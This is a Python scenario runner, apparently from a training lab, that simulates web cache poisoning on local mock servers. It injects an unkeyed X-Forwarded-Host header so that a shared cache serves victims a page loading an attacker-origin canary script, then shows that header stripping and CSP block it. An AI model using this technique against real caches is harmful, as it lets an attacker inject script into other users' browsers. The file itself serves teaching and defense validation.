"""
Scenario Execution Engine.
Orchestrates each phase of the Web Cache Poisoning simulation:
1. Baseline legitimate traffic.
2. Unkeyed header poisoning.
3. Victim impact verification.
4. Remediation, defense validation, and proof.
"""

import re
import time
from typing import Dict, Tuple
import requests

from config import SimulationConfig, DEFAULT_CONFIG
from core.cache_proxy import ProxyCacheServer
from core.upstream_app import UpstreamServer
from core.mock_attacker_origin import MockAttackerServer
from sim import visualizer


class SimulationScenarioRunner:
    """Manages the full lifecycle of the Web Cache Poisoning scenario."""

    def __init__(self, config: SimulationConfig = DEFAULT_CONFIG):
        self.config = config
        self.upstream: UpstreamServer = None
        self.proxy: ProxyCacheServer = None
        self.attacker: MockAttackerServer = None

    def start_servers(self, upstream_mode: str = "vulnerable", proxy_strip_headers: bool = False, harden_keys: bool = False) -> None:
        """Starts all 3 backend components in background threads."""
        self.stop_servers()

        self.upstream = UpstreamServer(self.config, mode=upstream_mode)
        self.upstream.start_background()

        self.attacker = MockAttackerServer(self.config)
        self.attacker.start_background()

        self.proxy = ProxyCacheServer(
            self.config,
            strip_unkeyed_headers=proxy_strip_headers,
            harden_keys=harden_keys,
        )
        self.proxy.start_background()

        # Wait for socket availability
        self._wait_for_ready()

    def stop_servers(self) -> None:
        """Stops all running test servers."""
        if self.proxy:
            self.proxy.stop()
            self.proxy = None
        if self.upstream:
            self.upstream.stop()
            self.upstream = None
        if self.attacker:
            self.attacker.stop()
            self.attacker = None

    def _wait_for_ready(self, timeout: float = 3.0) -> None:
        start = time.time()
        for url in [self.config.upstream_url + "/health", self.config.attacker_origin_url + "/health"]:
            ready = False
            while time.time() - start < timeout:
                try:
                    r = requests.get(url, timeout=0.5)
                    if r.status_code == 200:
                        ready = True
                        break
                except Exception:
                    time.sleep(0.05)
            if not ready:
                raise RuntimeError(f"Server at {url} failed to start within {timeout}s")

    def extract_script_src(self, html: str) -> str:
        """Extracts the src attribute from <script src="..."> in the HTML."""
        match = re.search(r'<script\s+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
        return match.group(1) if match else "UNKNOWN"

    def run_phase_1_baseline(self) -> dict:
        """Phase 1: Legitimate User Baseline Traffic."""
        visualizer.print_phase_header(
            1,
            "Baseline Traffic Analysis (Normal CDN Caching)",
            "User Alice visits the portal. Cache evaluates request, encounters a MISS, "
            "fetches from upstream, and caches the authentic response. User Bob then visits and receives a cache HIT."
        )

        # 1. User Alice requests portal
        alice_resp = requests.get(f"{self.config.cache_proxy_url}/")
        alice_key = alice_resp.headers.get("X-Cache-Key", "N/A")
        alice_cache = alice_resp.headers.get("X-Cache", "MISS")
        alice_src = self.extract_script_src(alice_resp.text)

        visualizer.print_transaction(
            actor="User Alice (Innocent Client)",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers={},
            cache_status=alice_cache,
            cache_key=alice_key,
            status_code=alice_resp.status_code,
            script_source=alice_src,
            verdict="SAFE: Authentic upstream assets loaded. Response cached at edge.",
        )

        time.sleep(0.1)

        # 2. User Bob requests portal
        bob_resp = requests.get(f"{self.config.cache_proxy_url}/")
        bob_key = bob_resp.headers.get("X-Cache-Key", "N/A")
        bob_cache = bob_resp.headers.get("X-Cache", "HIT")
        bob_src = self.extract_script_src(bob_resp.text)

        visualizer.print_transaction(
            actor="User Bob (Innocent Client)",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers={},
            cache_status=bob_cache,
            cache_key=bob_key,
            status_code=bob_resp.status_code,
            script_source=bob_src,
            verdict="SAFE: Served from Edge Cache (HIT). Authentic asset maintained.",
        )

        return {
            "alice_cache": alice_cache,
            "bob_cache": bob_cache,
            "bob_src": bob_src,
        }

    def run_phase_2_poisoning(self) -> dict:
        """Phase 2: Attacker Exploits Unkeyed Header to Poison Cache."""
        visualizer.print_phase_header(
            2,
            "Unkeyed Header Injection & Cache Desynchronization",
            "Attacker targets the root URL. The edge cache key only consists of METHOD + HOST + PATH. "
            "The attacker injects 'X-Forwarded-Host: 127.0.0.1:8882'. The edge proxy ignores this header "
            "when generating the cache key, but forwards it upstream. The upstream dynamically reflects "
            "it into the script import, and the proxy caches the poisoned response under the clean cache key."
        )

        # Purge cache to simulate cache expiration / new resource window
        requests.get(f"{self.config.cache_proxy_url}/cache/purge")

        attacker_headers = {
            self.config.UNKEYED_POISON_HEADER: f"{self.config.HOST}:{self.config.ATTACKER_ORIGIN_PORT}"
        }

        attacker_resp = requests.get(f"{self.config.cache_proxy_url}/", headers=attacker_headers)
        atk_key = attacker_resp.headers.get("X-Cache-Key", "N/A")
        atk_cache = attacker_resp.headers.get("X-Cache", "MISS")
        atk_src = self.extract_script_src(attacker_resp.text)

        visualizer.print_transaction(
            actor="Attacker (Mallory)",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers=attacker_headers,
            cache_status=atk_cache,
            cache_key=atk_key,
            status_code=attacker_resp.status_code,
            script_source=atk_src,
            verdict="EXPLOIT STAGED: Upstream reflected unkeyed host. Cache stored poisoned response under shared key!",
        )

        return {
            "atk_cache": atk_cache,
            "atk_key": atk_key,
            "atk_src": atk_src,
        }

    def run_phase_3_impact(self) -> dict:
        """Phase 3: Innocent Victim Receives Poisoned Response from Edge Cache."""
        visualizer.print_phase_header(
            3,
            "High-Severity Impact Verification (Downstream Victims)",
            "Innocent User Charlie requests the homepage using a standard browser without ANY malicious headers. "
            "Because the cache key matches the attacker's request, the edge proxy serves the cached response. "
            "Charlie's browser executes the attacker's script rather than the authentic corporate application."
        )

        charlie_resp = requests.get(f"{self.config.cache_proxy_url}/")
        charlie_key = charlie_resp.headers.get("X-Cache-Key", "N/A")
        charlie_cache = charlie_resp.headers.get("X-Cache", "HIT")
        charlie_src = self.extract_script_src(charlie_resp.text)

        # Simulate Charlie's browser fetching the referenced script asset
        victim_canary_executed = False
        if charlie_src.startswith("http"):
            script_resp = requests.get(charlie_src)
            if "__POISONED_CANARY__" in script_resp.text:
                victim_canary_executed = True

        visualizer.print_transaction(
            actor="User Charlie (Innocent Victim)",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers={},
            cache_status=charlie_cache,
            cache_key=charlie_key,
            status_code=charlie_resp.status_code,
            script_source=charlie_src,
            verdict="CRITICAL COMPROMISE: Victim served poisoned cache! Browser loads hostile script from attacker origin.",
        )

        visualizer.print_cvss_assessment()

        return {
            "charlie_cache": charlie_cache,
            "charlie_src": charlie_src,
            "victim_canary_executed": victim_canary_executed,
        }

    def run_phase_4_remediation(self) -> dict:
        """Phase 4: Apply Full Enterprise Hardening & Defense-in-Depth."""
        visualizer.print_phase_header(
            4,
            "Remediation & Defense-in-Depth Verification",
            "Applying defense layers:\n"
            "1. Proxy Layer: Strip untrusted X-Forwarded-* headers at the edge.\n"
            "2. Upstream Layer: Bind static asset imports to canonical domain (never trust request headers).\n"
            "3. Protocol Layer: Emit Content-Security-Policy (CSP) and Vary headers.\n"
            "Re-running the exploit to prove the attack is completely mitigated."
        )

        # Re-start with hardened settings: Proxy strips unkeyed headers, Upstream operates in hardened mode
        self.start_servers(upstream_mode="hardened", proxy_strip_headers=True)
        requests.get(f"{self.config.cache_proxy_url}/cache/purge")

        # 1. Attacker tries to inject unkeyed header again
        attacker_headers = {
            self.config.UNKEYED_POISON_HEADER: f"{self.config.HOST}:{self.config.ATTACKER_ORIGIN_PORT}"
        }

        atk_hardened_resp = requests.get(f"{self.config.cache_proxy_url}/", headers=attacker_headers)
        atk_src = self.extract_script_src(atk_hardened_resp.text)
        csp_header = atk_hardened_resp.headers.get("Content-Security-Policy", "None")

        visualizer.print_transaction(
            actor="Attacker (Mallory) [Post-Hardening Attempt]",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers=attacker_headers,
            cache_status=atk_hardened_resp.headers.get("X-Cache", "MISS"),
            cache_key=atk_hardened_resp.headers.get("X-Cache-Key", "N/A"),
            status_code=atk_hardened_resp.status_code,
            script_source=atk_src,
            verdict="ATTACK BLOCKED: Header stripped at edge proxy & upstream canonical domain enforced.",
            csp_header=csp_header,
        )

        # 2. Innocent User David visits the site
        david_resp = requests.get(f"{self.config.cache_proxy_url}/")
        david_src = self.extract_script_src(david_resp.text)
        david_csp = david_resp.headers.get("Content-Security-Policy", "None")

        visualizer.print_transaction(
            actor="User David (Innocent Client) [Post-Hardening]",
            method="GET",
            url=f"{self.config.cache_proxy_url}/",
            headers={},
            cache_status=david_resp.headers.get("X-Cache", "HIT"),
            cache_key=david_resp.headers.get("X-Cache-Key", "N/A"),
            status_code=david_resp.status_code,
            script_source=david_src,
            verdict="FULLY SECURE: Authentic asset served. CSP guarantees script execution boundary.",
            csp_header=david_csp,
        )

        return {
            "atk_src": atk_src,
            "david_src": david_src,
            "csp_header": csp_header,
        }

